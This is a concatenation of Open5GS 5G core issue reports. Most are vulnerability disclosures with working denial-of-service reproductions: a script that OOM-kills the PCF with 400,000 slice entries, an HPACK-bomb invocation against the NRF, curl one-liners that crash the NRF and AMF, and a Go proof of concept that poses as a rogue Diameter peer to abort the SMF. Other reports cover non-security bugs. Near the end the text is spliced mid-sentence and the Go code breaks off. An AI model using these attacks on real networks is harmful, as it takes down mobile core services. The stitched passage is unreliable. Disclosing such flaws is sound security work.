items.title: [Bug]: S-NSSAI metric-cardinality explosion via Npcf_AMPolicyControl causing unbounded memory growth and OOM kill(PCF)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Summary

- **Commit ID:** `d5d735c67356ff4cb2d86be6effadcc351b5b7b5` (`main`, 2026-10-09)
- **CVSS 4.0:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` (**8.7 High**)
- **Vulnerability Type:** Uncontrolled Resource Consumption (CWE-400) / Allocation of Resources without Limits or Throttling (CWE-770)

On `POST /npcf-am-policy-control/v1/policies`, the PCF walks the client-supplied `allowedSnssais`
array and allocates one Prometheus metric instance per element, keyed by the client-controlled
`(plmn, sst, sd)` (`src/pcf/npcf-handler.c:241-253` → `pcf_metrics_inst_by_slice_add`,
`src/pcf/metrics.c:128-182`). The instances live in a process-global hash that is never evicted at
runtime (cleared only at shutdown, `metrics.c:207-220`), the array length is uncapped (the
generated parser ignores the OpenAPI `maxItems`), and the allocation happens before the request is
authorised/completed — so the state persists even when the request fails. Identical S-NSSAIs dedup
in the hash (`metrics.c:178`); distinct ones never do.

Why this is a resource-consumption problem: each distinct S-NSSAI costs ~1.4 kB of permanent RSS
and adds one more series that every `/metrics` scrape must render, so one small HTTP/2 (h2c) POST
carrying N distinct S-NSSAIs permanently inflates both. Verified live:
5 requests × 3,000 fresh S-NSSAIs grew PCF RSS 295,924 → 316,672 kB (**+20.7 MB, monotonic, never
reclaimed**) and the `/metrics` scrape from 1.6 ms / 1.7 kB to **3.19 s / 1.1 MB** (~2000× slower);
the same requests with identical S-NSSAIs added +5.5 MB once and then stayed flat (+4 kB), with a
~2 ms scrape and exactly one new metric series — isolating client-controlled metric cardinality as
the cause.

## Open5GS Release, Revision, or Tag

v2.8.0

## Step to Reproduce

Restart the environment before every verification (shut down any other running core first):

```bash
git clone https://github.com/hackeryounow/5gc-deployments.git
cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
sleep 45                     # let the NFs register at the NRF
docker start smsc            # smsc races the MySQL init on a cold start


# wait for the PCF (container IP pinned in .env), then cap the container at 1 GiB:
until [ "$(curl --http2-prior-knowledge -s -o /dev/null -w '%{http_code}' --max-time 5 \
          http://172.22.0.27:7777/npcf-smpolicycontrol/v1/sm-policies)" = "400" ]; do sleep 3; done
docker update --memory 1g --memory-swap 1g pcf        # cap RSS and swap together

# the attack: one POST carrying 400,000 fresh S-NSSAIs (~11 MB). The body must be built into a
# file - the kernel caps a single argv at 128 KiB (~4600 elements) - and sent with -d @file:
python3 - <<'PY' > /tmp/am_policy_400k.json
import json
snssais = [{"sst": 1, "sd": "%06x" % (400001 + i)} for i in range(400000)]
print(json.dumps({"supi": "imsi-460091234567895",
                  "notificationUri": "http://172.23.0.10:7777/namf-cb/v1/am-policy/x",
                  "suppFeat": "0", "allowedSnssais": snssais}))
PY
curl --http2-prior-knowledge -s -o /dev/null -w '%{http_code}\n' --max-time 300 \
     -X POST -H 'Content-Type: application/json' -d @/tmp/am_policy_400k.json \
     http://172.22.0.27:7777/npcf-am-policy-control/v1/policies   # PCF dies mid-request (~13 s)
rm -f /tmp/am_policy_400k.json

# check whether the PCF has been OOM-killed
docker inspect pcf --format '{{.State.Status}} (ExitCode {{.State.ExitCode}}, OOMKilled {{.State.OOMKilled}})'
# -> exited (ExitCode 137, OOMKilled true)  [dmesg: Memory cgroup out of memory: Killed process ... open5gs-pcfd]
```

## Logs

Verification run 2026-10-18 (`pcf` container log; one Setup/UnRef pair per crafted POST — the
metric instances are committed during this handling, before any outcome):

```
10/19 13:49:40.229: [sbi] INFO: [6c80e34a-cb6c-41f1-bab9-43fe69017df2] (NRF-profile-get) NF registered (../lib/sbi/nf-sm.c:104)
10/19 13:49:40.229: [sbi] INFO: [BSF] NFInstance associated [6c80e34a-cb6c-41f1-bab9-43fe69017df2] (../lib/sbi/context.c:2498)
10/19 13:49:40.229: [sbi] INFO: Setup NF EndPoint(addr) [172.22.0.29:80] (../lib/sbi/context.c:2503)
10/19 13:49:40.229: [sbi] INFO: [nbsf-management] NFService associated [6c83305a-cb6c-41f1-bab9-43fe69017df2] (../lib/sbi/context.c:2138)
10/19 13:49:40.230: [sbi] INFO: Setup NF EndPoint(addr) [172.22.0.29:7777] (../lib/sbi/context.c:2141)
10/19 13:49:40.230: [sbi] INFO: [6d1addb0-cb6c-41f1-9483-273b1a6a51fe] (NRF-profile-get) NF registered (../lib/sbi/nf-sm.c:104)
10/19 13:49:40.230: [sbi] INFO: [UDR] NFInstance associated [6d1addb0-cb6c-41f1-9483-273b1a6a51fe] (../lib/sbi/context.c:2498)
10/19 13:49:40.230: [sbi] INFO: Setup NF EndPoint(addr) [172.22.0.14:80] (../lib/sbi/context.c:2503)
10/19 13:49:40.230: [sbi] INFO: [nudr-dr] NFService associated [6d1b8436-cb6c-41f1-9483-273b1a6a51fe] (../lib/sbi/context.c:2138)
10/19 13:49:40.230: [sbi] INFO: Setup NF EndPoint(addr) [172.22.0.14:7777] (../lib/sbi/context.c:2141)
10/19 13:49:41.678: [pcf] ERROR: Not found [/npcf-smpolicycontrol/v1/sm-policies] (../src/pcf/pcf-sm.c:264)
10/19 13:50:08.813: [pcf] INFO: Setup NF EndPoint(addr) [172.23.0.10:7777] (../src/pcf/npcf-handler.c:150)
/open5gs_init.sh: line 102:    18 Killed                  ./open5gs-pcfd
```


## Expected behaviour

`allowedSnssais` reflects the operator-configured slice set (TS 29.513); per-slice metric cardinality must not grow with arbitrary client-supplied `(sst, sd)` values.

## Observed Behaviour

Five requests of 3,000 fresh S-NSSAIs permanently grew PCF RSS by +20.7 MB (never reclaimed) and slowed the `/metrics` scrape ~2000× (1.6 ms → 3.19 s), while identical S-NSSAIs dedup and stay flat. Under a 1 GiB container memory cap a single POST of 400,000 fresh S-NSSAIs escalates to a kernel OOM kill of the PCF (`exit 137`, `OOMKilled=true`) in ~13 s; sustained high cardinality also saturates the SBI core.

## eNodeB/gNodeB

Not applicable — the attack surface is the PCF SBI only; no gNodeB is involved in the reproduction.

## UE Models and versions

Not applicable — no UE is registered for this test; requests are crafted directly against the SBI.

## Impact

A lot of requests permanently consume PCF memory and blind monitoring; under a container memory cap a single request kills the PCF outright (exit 137), leaving the core without policy control until an operator restarts it.

items.title: UDM: SDM subscriptions are never released for UEs that vanish without deregistering, so the 4096 pool fills and registrations fail as "5GS services not allowed" with no AMF-side error

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Version

Open5GS **2.7.5** (container `gradiant/open5gs:2.7.5`), Kubernetes, single node. AMF/SMF/UDM/UDR/AUSF/NRF/SCP/PCF/BSF all 2.7.5.

### Summary

The UDM's SDM subscription pool is bounded at 4096 and entries are not reclaimed when a UE disappears without a clean deregistration. Because roughly 8 subscriptions are consumed per registered UE, this caps concurrent UEs at about 500 — and, critically, the consumed entries **persist across test runs**, so the effective ceiling drops every time a batch of UEs is killed rather than deregistered.

The failure is hard to diagnose because **the AMF logs nothing**. The UE sees `5GS services not allowed`, which reads like a subscription/provisioning problem, and only the UDM log reveals the real cause.

### What I observed

Registering UEs in batches with a load generator (PacketRusher) against a freshly started core:

- 1, 10, 25, 50, 100, 200 UEs: all register cleanly.
- 500 UEs: **only 375 registered**, the rest rejected.
- UDM log: `Maximum number of SDM Subscriptions [4096] reached (../src/udm/context.c:381)` repeated, plus `udm_sdm_subscription_add() failed (../src/udm/nudm-handler.c:708)` per affected SUPI.
- AMF log for the same period: **no errors or warnings at all**.
- UE-visible cause: `5GMM cause: 5GS services not allowed`.

Restarting only the UDM (nothing else) and immediately repeating the same 500-UE run gives **500/500 registered**. That is what identifies it as accumulation rather than a capacity limit: the 375 figure was leftovers from earlier runs, not a property of the current one.

### Why entries accumulate

The load generator is stopped by killing the process, so the UEs never send a Deregistration Request. Any real-world equivalent — a crashed RAN simulator, a node losing power, a container being killed — would leave the same residue. After enough such events the pool is exhausted and the core refuses new registrations until the UDM is restarted, with no indication at the AMF that the UDM is the cause.

### Reproduction

1. Start a clean Open5GS 2.7.5 core and provision N subscribers.
2. Register ~400 UEs, then kill the RAN simulator without deregistering.
3. Repeat. Each cycle consumes pool entries permanently.
4. Watch `Maximum number of SDM Subscriptions [4096] reached` appear in the UDM log while the AMF stays silent, and registrations start failing with `5GS services not allowed`.

### Workaround

Setting `global.max.ue` above the default in the **UDM** configuration removes the ceiling for a given run:

```yaml
global:
  max:
    ue: 8192
```

After this the `Maximum number of SDM Subscriptions` errors stop entirely. It does not address the underlying non-reclamation — a UDM restart is still needed between runs — but it raises the bar.

### Suggestions

Two things would each have saved a lot of diagnosis time here, independently of whether the reclamation behaviour is considered a bug:

1. **Surface the cause upstream.** When the UDM returns a failure for `udm_sdm_subscription_add()`, the AMF currently logs nothing and the UE receives a generic `5GS services not allowed`. Logging the UDM-side reason at the AMF, or mapping it to a more specific 5GMM cause, would point at the real problem.
2. **Reclaim or age out SDM subscriptions** whose UE context no longer exists — for example on AMF context release, or via a TTL — so that an unclean RAN teardown does not permanently consume pool entries.

Happy to provide fuller logs or retest against a patch.

items.title: [Bug]: Static IPv4 assigned to Subscriber A can be dynamically allocated to Subscriber B after profile modification

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

The issue was observed while using static IPv4 assignments.

The following sequence appears to reproduce the problem:

1. Subscriber A is configured with a static IPv4 address.
   Example:
       IMSI: 999990000000002
       UE IPv4 Address: 100.80.1.2

2. Subscriber B is not using static IP.

3. Subscriber B establishes a new PDU Session.

4. SMF allocates the IPv4 address that is statically configured for Subscriber A
   (100.80.0.2), even though Subscriber A still owns that address in its subscriber profile.

5. Later, Subscriber A loses connectivity.

6. Subscriber A no longer sends new Registration/PDU Session procedures successfully until either:
   - the UE is rebooted, or
   - the Open5GS core services are restarted.

The problem was confirmed by checking SMF logs using the duplicated IPv4 address rather than the IMSI.


### Logs

```shell
07/08 07:03:37.779: [ausf] INFO: [imsi-999990000000003] AUSF-UE removed (../src/ausf/ausf-sm.c:378)
07/08 07:03:37.776: [smf] INFO: Removed Session: UE IMSI:[imsi-999990000000003] DNN:[test:6] IPv4:[100.80.1.2] IPv6:[2001:db8:cafe:200::201] (../src/smf/context.c:1789)
07/08 07:04:07.668: [smf] INFO: UE SUPI[imsi-999990000000003] DNN[test] IPv4[100.80.1.3] IPv6[2001:db8:cafe:2a9::2aa] (../src/smf/npcf-handler.c:590)
```

### Expected behaviour

A statically assigned IPv4 address must never be allocated dynamically to another subscriber.

The IPv4 allocator should exclude all statically assigned addresses from the dynamic allocation pool, regardless of whether another subscriber has recently been modified.

At no point should two different subscribers be able to obtain the same IPv4 address.

At the smf.yaml and upf.yaml files, its possible to configure the subnet address, but is not possible to define the dynamic address pool.


### Observed Behaviour

SMF dynamically allocated an IPv4 address that was statically assigned to another subscriber.

After this happened:

- Subscriber A lost connectivity.
- Subscriber A no longer generated successful registration/PDU session procedures.
- Restarting the gNB did not solve the issue.
- Rebooting the UE restored connectivity.
- Restarting the Open5GS core also restored connectivity.

Additionally, the subscriber's PDU session was still visible through the Open5GS PDU session API, while no corresponding database session existed.

### eNodeB/gNodeB

Zary 

### UE Models and versions

Huawei 153-381

items.title: [Bug]: HTTP/2 HPACK Memory Leak in Open5GS 5G Core NFs (Remote Memory-Exhaustion DoS)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Summary

open5GS's HTTP/2 SBI server converts every received header field into a hash-table entry with ogs_sbi_header_set(), which strdups both the name and the value. When a header name repeats, ogs_hash_set_debug() overwrites the stored value pointer without freeing the previous one and find_entry() returns early without taking ownership of the newly duplicated key — so both strings leak, permanently, per repeated header field.

On its own that bug is bounded: libnghttp2 rejects any single header field value larger than 65 536 bytes and any block fragmented into more than ~9 CONTINUATION frames, so a literal (uncompressed) request can carry at most ~152 such headers and leak roughly what it cost to send (~1:1).

Neither limit bounds the number of header fields, and HPACK removes the practical bound. By first planting 4 entries in the server-side HPACK dynamic table and then sending a header block of one-byte indexed references to them, a 4-frame, 64 KiB block delivers 64 000 repeated header fields — and therefore ~64 MB of leaked heap — per request. That is a ~1000× amplification of the leak per wire byte, turning a self-limiting defect into a remote OOM.

### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

One command, against the NRF.
[`hpack_bomb.py`](https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/CVE-2026-106806/hpack_bomb.py) carries a working default for every parameter, has no mandatory flag, and **performs no file I/O at all** — it reads nothing and writes nothing, so it cannot overwrite an artefact.
stdout is the whole record: every frame put on the wire, every frame received, and the container RSS before and after each request.

It depends only on `hpack` and `hyperframe` — it speaks HTTP/2 itself rather than through a library connection, because the bomb needs byte-level control of HPACK encoding and of frame fragmentation, which no library encoder will emit.

```bash
pip install hpack==4.2.0 hyperframe==6.1.0

# 1. Cap the NRF. Without a limit the leak is just as real, but the host has the
#    headroom to absorb it and nothing observable happens. The limit is applied
#    OUT OF BAND - it is not in the compose file, so every `docker compose up -d`
#    or `--force-recreate` silently resets it to Memory=0 and the NRF becomes
#    unkillable again. Verify it immediately before every kill run.
docker update --memory 1g --memory-swap 1g nrf
docker inspect -f 'Memory={{.HostConfig.Memory}}' nrf 

# 2. Run the bomb. stdout is the evidence - tee it wherever you like.
python3 ../hpack_bomb.py --host 172.22.0.12 --port 7777 --tests hpackbomb \
    --bomb-path '/nnrf-nfm/v1/nf-instances?nf-type=AMF' --bomb-refs 64000 \
    --wait 15 --repeat 100 --stats-container nrf

# 3. Confirm the kernel killed the process, not the tool.
docker inspect -f 'OOMKilled={{.State.OOMKilled}} ExitCode={{.State.ExitCode}}' nrf
dmesg | grep -iE 'oom-kill|Killed process' | tail -5

# 4. Restore. --force-recreate is required: `docker update --memory 0` does NOT
#    clear an already-applied limit. Use your deployment compose file with -f.
docker compose -p open5gs up -d --no-deps --force-recreate nrf
```

Expected: RSS climbs **+72.4 MiB per request and never falls back**, then the kernel OOM-killer takes `open5gs-nrfd` on **request 11** — roughly 90 s and 705 KB of traffic in total.
`--repeat 20` is a ceiling, not a count: the tool aborts with `FATAL: connect/handshake failed: timed out` as soon as the NRF is gone, then exits 2.

Every flag in that command is already the built-in default, so it is equivalent to a bare `python3 ../hpack_bomb.py --repeat 20`.
It is spelled out because that is the exact invocation that produced the evidence:

| flag | default | role |
|---|---|---|
| `--host` / `--port` | `172.22.0.12` / `7777` | the NRF's SBI address |
| `--tests` | `hpackbomb` | compatibility shim — the bomb is the only test |
| `--bomb-path` | `/nnrf-nfm/v1/nf-instances?nf-type=AMF` | the NRF discovery URI from the task |
| `--bomb-refs` | `64000` | 64 059 B on the wire → 63.36 MB decoded, ~72.4 MiB retained |
| `--wait` | `15.0` | per-response deadline, **not** an inter-request delay |
| `--repeat` | `1` | **must be raised** — one bomb leaks once and crashes nothing |
| `--stats-container` | `nrf` | samples RSS; the delta is the leak evidence |

**The kill point scales with the cap.** `requests_to_kill = (cap_MiB − 273) / 72.4 + 1`, so a 1 GiB cap dies on request 11 while a 2 GiB cap needs request 25 — under which `--repeat 20` silently fails to crash anything.
Size `--repeat` above the computed kill point.

### Logs

```shell
09/10 12:17:43.799: [nrf] INFO: Setup NF EndPoint(addr) [172.22.0.21:7777] (../src/nrf/nnrf-handler.c:665)
09/10 12:17:43.799: [nrf] INFO: [92014c16-acce-41f1-9c77-f9e90ba2eda9] Subscription created until 2026-09-11T12:17:43.799623+08:00 [duration:86400000000,validity:86400.000000] (../src/nrf/nnrf-handler.c:693)
/open5gs_init.sh: line 102:    16 Killed                  ./open5gs-nrfd
```

### Expected behaviour

The server should bound the total decoded header list and free displaced hash entries, so a HPACK bomb is rejected (or at worst leaks nothing) and no memory is pinned per request.

### Observed Behaviour

A 64 KiB HPACK bomb is accepted as 200 OK (open5GS sets no SETTINGS_MAX_HEADER_LIST_SIZE), leaks +72.4 MiB per request — linearly and permanently, never reclaimed even when idle — and 11 such requests (≈705 KB, 90 s, no authentication required) OOM-kill the NRF 3/3.

### eNodeB/gNodeB

None

### UE Models and versions

None

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (master)

### Steps to reproduce

https://gerrit.osmocom.org/c/osmo-ttcn3-hacks/+/43873

### Logs

```shell
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Response Timeout for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:623)
10/12 11:54:40.821: [pfcp] WARNING: [2] LOCAL  No Reponse. Give up! for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:642)
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Delete  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:836)
10/12 11:54:40.821: [smf] DEBUG: smf_state_operational(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/smf-sm.c:94)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] WARNING: No Heartbeat from UPF [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:426)
10/12 11:54:40.821: [smf] ERROR: No UPF available (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:528)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): EXIT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] INFO: PFCP de-associated [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:205)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_will_associate(): ENTRY (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:74)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Create  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:131)
10/12 11:54:40.821: [pfcp] DEBUG: Association Setup Request (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/build.c:87)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  UPD TX-5  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:231)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Commit  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:500)
```

### Expected behaviour

As of current main  (d5d735c67356ff4cb2d86be6effadcc351b5b7b5), open5gs-smfd doesn't release UE sessions after the only UPF available is considered to be unavailable after obtaining no answer for a while (eg. multiple Heartbeat Requests not answered).

With current implementation, open5gs-smfd will keep trying forever until the UPF is available again and it sends a newer (bigger) Recovery timestamp which starts restoration value. 

The problem with that is that it may take a long time, or even "forever", for the UPF to become available again, and during that potentially long time the Control Plane assumes the user plane is working just fine, because the sessions are still active, which is false. This means for instance time accounting may go on on the OCS, etc.

Instead, when a Heartbeat timeout happens (configurable by the user, eg. 60 seconds) and the UPF is considered unavailable, it should release all the sessions on the core network so that the subscriber can see it has no PDU session instead of simply seeing no traffic passing through.

What do the specs say about this scenario? Well, they basically say it's "implementation specific".

3GPP TS 29.244 5.8.2 Behaviour with an Established PFCP Association
> When a PFCP Association is established with a UP function, the CP function:
> ...
> - shall check the responsiveness of the UP function using the Heartbeat procedure as specified in clause 6.2.2;

3GPP TS 23.527 4.2 N4 Failure and Restart Detection:
> Across PFCP based interfaces, an SMF and UPF shall utilize the PFCP Heartbeat Request and Heartbeat Response
> messages to detect a peer PFCP entity failure or restart as described in clause 19A of 3GPP TS 23.007

3GPP TS 23.527 4.5 N4 path failure:
> If the N4 path to the UPF is down, the SMF should handle this as an UPF Failure without Restart, see clause 4.3.3.

4.3.3 Restoration Procedure for PSA UPF Failure without Restart
> Procedures for PSA UPF failure without restart are implementation specific.

### Observed Behaviour

See "Expected behaviour" section.

### eNodeB/gNodeB

TTCN-3

### UE Models and versions

_No response_

items.body:
### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

To reproduce, execute:
curl --http2-prior-knowledge -X PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/a4321a76-2f23-4b73-8999-f73459f474fd -H "Content-Type: application/json" -d '{"nfInstanceId": "a4321a76-2f23-4b73-8999-f73459f474fd", "nfType": "SCP", "nfStatus": "REGISTERED", "scpInfo": {"scpDomainInfoList": {"domain1": {"scpFqdn": "scp.example.com"}}}}'

In the handle_scp_info function, a local variable scp_info of type ogs_sbi_scp_info_t is declared on the stack but is not initialized. If an incoming NFProfile contains an scpInfo object with a scpDomainInfoList but no scpPorts, the code proceeds to process the domain list. The uninitialized scp_info.num_of_domain field, which contains a garbage value from the stack, is then used as an index into the scp_info.domain array. This results in writing data out of bounds on the stack, causing memory corruption and leading to a program crash.

### Logs


### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

To reproduce, execute:
curl --http2-prior-knowledge 'http://127.0.0.10:7777/nnrf-disc/v1/nf-instances?p1=v1&p2=v2&p3=v3&p4=v4&p5=v5&p6=v6&p7=v7&p8=v8&p9=v9&p10=v10&p11=v11&p12=v12&p13=v13&p14=v14&p15=v15&p16=v16&p17=v17'

The on_header function in nghttp2-server.c is responsible for parsing HTTP/2 headers.         {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "17"}
      ]
    }
  }
}))')

curl -i -X POST \
     -H "Content-Type: application/json" \
     --http2-prior-knowledge \
     --data "$PAYLOAD" \
     http://127.0.0.5:7777/nnrf-nfm/v1/nf-status-notify


The handle_amf_info() function processes incoming AMF profiles, which can be received via an NRF notification. This function iterates over a guamiList provided in the request payload. Inside the loop, it uses ogs_assert(nf_info->amf.num_of_guami < OGS_MAX_NUM_OF_SERVED_GUAMI) to validate the number of GUAMI entries. An assertion is a debugging tool that intentionally crashes the program if its condition is false. Because the guamiList is controllable by an external entity, an attacker can send a list with more entries than the allowed maximum (OGS_MAX_NUM_OF_SERVED_GUAMI, which is 16). This triggers the assertion, causing the AMF process to terminate immediately.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Description
`smf_gx_cca_cb()`, `smf_gy_cca_cb()`, and `smf_s6b` CCA callbacks use
`ogs_assert(new == 0)` after `fd_msg_sess_get()` to verify the session
already exists. If a malicious Diameter peer replies with a CCA containing
an unknown or mismatched `Session-Id`, `fd_msg_sess_get()` returns `new=1`
(new session), triggering `ogs_assert()` → `ogs_abort()` → **SMF process crash**.

A single malformed CCA message is sufficient to crash the SMF, denying
service to all UE sessions.

### Steps to reproduce


1. Start the DoS PoC

```bash
go mod tidy
go run . \
  -listen 10.44.44.9:3868 \
  -cer-host pcrf.localdomain \
  -cer-realm localdomain \
  -mode bogus-session
```
PoC
```go
package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	"github.com/fiorix/go-diameter/v4/diam"
	"github.com/fiorix/go-diameter/v4/diam/avp"
	"github.com/fiorix/go-diameter/v4/diam/datatype"
	"github.com/fiorix/go-diameter/v4/diam/dict"
	"github.com/fiorix/go-diameter/v4/diam/sm"
)

// Gx Application ID (3GPP TS 29.212)
const gxApplicationID uint32 = 16777238

// Gy Application ID (DCCA, RFC 4006)
const gyApplicationID uint32 = 4

// 3GPP Vendor ID
const vendor3GPP uint32 = 10415

var (
	flagListen   = flag.String("listen", "127.0.0.9:3868", "Listen address (replace legitimate PCRF/OCS)")
	flagCERHost  = flag.String("cer-host", "pcrf.localdomain", "Origin-Host for CER/CEA handshake (must match ConnectPeer)")
	flagCERRealm = flag.String("cer-realm", "localdomain", "Origin-Realm for CER/CEA handshake")
	flagMode     = flag.String("mode", "bogus-session", "DoS mode: bogus-session | cross-app")
)

func main() {
	flag.Parse()
	log.SetFlags(log.Ltime | log.Lmicroseconds)

	log.Println("========================================")
	log.Println("  PoC: SMF CCA Session Assertion DoS")
	log.Println("  Vulnerability: ogs_assert(new == 0)")
	log.Println("  Affected files:")
	log.Println("    - src/smf/gx-path.c:779")
	log.Println("    - src/smf/gy-path.c:1009")
	log.Println("    - src/smf/s6b-path.c:390, 733")
	log.Println("========================================")
	log.Printf("[*] Listen address  : %s", *flagListen)
	log.Printf("[*] CER/CEA Identity: %s / %s", *flagCERHost, *flagCERRealm)
	log.Printf("[*] DoS mode        : %s", *flagMode)

	settings := &sm.Settings{
		OriginHost:       datatype.DiameterIdentity(*flagCERHost),
		OriginRealm:      datatype.DiameterIdentity(*flagCERRealm),
		VendorID:         datatype.Unsigned32(vendor3GPP),
		ProductName:      datatype.UTF8String("dos-poc"),
		OriginStateID:    datatype.Unsigned32(uint32(time.Now().Unix())),
		FirmwareRevision: datatype.Unsigned32(1),
	}

	mux := sm.New(settings)
	mux.HandleFunc("CCR", handleCCR)
	mux.HandleFunc("ALL", func(c diam.Conn, m *diam.Message) {
		if m.Header.CommandCode != diam.CreditControl {
			log.Printf("[~] Received %s (cmd=%d) from %s — ignoring",
				cmdName(m), m.Header.CommandCode, c.RemoteAddr())
		}
	})

	log.Printf("[*] Waiting for SMF to connect on %s ...", *flagListen)
	if err := diam.ListenAndServe(*flagListen, mux, dict.Default); err != nil {
		log.Fatalf("[-] ListenAndServe failed: %v", err)
	}
}

func handleCCR(c diam.Conn, m *diam.Message) {
	appID := m.Header.ApplicationID
	sessionID := extractUTF8(m, avp.SessionID, 0)
	ccRequestType := extractUint32(m, avp.CCRequestType, 0)
	ccRequestNumber := extractUint32(m, avp.CCRequestNumber, 0)

	log.Println()
	log.Println("[+] ============================================")
	log.Printf("[+] CCR received from SMF (%s)", c.RemoteAddr())
	log.Printf("[+] ApplicationId   : %d (%s)", appID, appName(appID))
	log.Printf("[+] Session-Id      : %s", sessionID)
	log.Printf("[+] CC-Request-Type : %d (%s)", ccRequestType, ccRequestTypeName(ccRequestType))

	mode := *flagMode
	switch mode {
	case "bogus-session":
		// Send CCA with a fabricated Session-Id that doesn't match any
		// existing session in the SMF. This causes fd_msg_sess_get() to
		// return new=1, triggering ogs_assert(new == 0) → abort().
		sendBogusSessionCCA(c, m, appID, ccRequestType, ccRequestNumber)

	case "cross-app":
		// Send CCA with Gx ApplicationId in response to a Gy CCR (or vice versa).
		// The session lookup in the wrong application's callback fails
		// with new=1, triggering the same assertion.
		sendCrossAppCCA(c, m, appID, sessionID, ccRequestType, ccRequestNumber)

	default:
		log.Fatalf("[-] Unknown mode: %s", mode)
	}
}

// sendBogusSessionCCA replies with a CCA containing a fabricated Session-Id.
// The SMF's fd_msg_sess_get() will not find this session, returning new=1.
// gx-path.c:779 / gy-path.c:1009: ogs_assert(new == 0) → abort()
func sendBogusSessionCCA(c diam.Conn, m *diam.Message, appID, ccRequestType, ccRequestNumber uint32) {
	bogusSessionID := fmt.Sprintf("bogus.attacker.com;%d;999;app_dos", time.Now().Unix())

	cca := m.Answer(2001)

	// Insert fabricated Session-Id as first AVP
	cca.InsertAVP(diam.NewAVP(avp.SessionID, avp.Mbit, 0,
		datatype.UTF8String(bogusSessionID)))

	cca.NewAVP(avp.OriginHost, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERHost))
	cca.NewAVP(avp.OriginRealm, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERRealm))
	cca.NewAVP(avp.AuthApplicationID, avp.Mbit, 0,
		datatype.Unsigned32(appID))
	cca.NewAVP(avp.CCRequestType, avp.Mbit, 0,
		datatype.Enumerated(ccRequestType))
	cca.NewAVP(avp.CCRequestNumber, avp.Mbit, 0,
		datatype.Unsigned32(ccRequestNumber))

	if _, err := cca.WriteTo(c); err != nil {
		log.Printf("[-] Failed to send CCA: %v", err)
		return
	}

	log.Println("[!] ----- DoS CCA SENT (bogus-session) -----")
	log.Printf("[!] Bogus Session-Id: %s", bogusSessionID)
	log.Println("[!] SMF will call fd_msg_sess_get() → new=1")
	log.Println("[!] ogs_assert(new == 0) → ogs_abort() → SMF CRASH")
	log.Println("[+] ============================================")
}

// sendCrossAppCCA replies to all CCRs with the same CCA (including Gx AVPs).
// When a Gy CCR gets a Gx-style CCA, the Gy callback's session lookup
// fails because the Session-Id belongs to a different application context.
func sendCrossAppCCA(c diam.Conn, m *diam.Message, appID uint32, sessionID string, ccRequestType, ccRequestNumber uint32) {
	// Always respond with Gx ApplicationId, regardless of what was requested
	cca := m.Answer(2001)

	cca.InsertAVP(diam.NewAVP(avp.SessionID, avp.Mbit, 0,
		datatype.UTF8String(sessionID)))

	cca.NewAVP(avp.OriginHost, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERHost))
	cca.NewAVP(avp.OriginRealm, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERRealm))
	// Force Gx ApplicationId regardless of original request
	cca.NewAVP(avp.AuthApplicationID, avp.Mbit, 0,
		datatype.Unsigned32(gxApplicationID))
	cca.NewAVP(avp.CCRequestType, avp.Mbit, 0,
		datatype.Enumerated(ccRequestType))
